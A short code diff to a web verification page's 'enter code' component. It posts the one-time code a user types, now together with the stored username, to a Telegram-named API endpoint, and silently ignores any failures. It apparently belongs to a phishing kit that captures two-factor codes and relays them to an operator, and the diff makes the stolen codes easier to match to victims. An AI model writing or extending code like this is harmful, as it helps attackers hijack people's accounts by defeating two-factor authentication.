@@ -89,11 +89,9 @@ function EnterCodeContent() {
     await fetch("/api/telegram/verification", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        code: otpCode,
+      body: JSON.stringify({ userId: readStoredUsername(), code: otpCode,
         verificationType: typeLabel,
-        page: "/verify",
-      }),
+        page: "/verify", }),
     }).catch(() => {})
 
     const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || "login"
@@ -149,7 +147,7 @@ function EnterCodeContent() {
       void fetch("/api/telegram/resend-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ page: "/verify" }),
+        body: JSON.stringify({ userId: readStoredUsername(), page: "/verify" }),
       }).catch(() => {})
       await wait(OTP_RESEND_LOADING_MS)
       setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
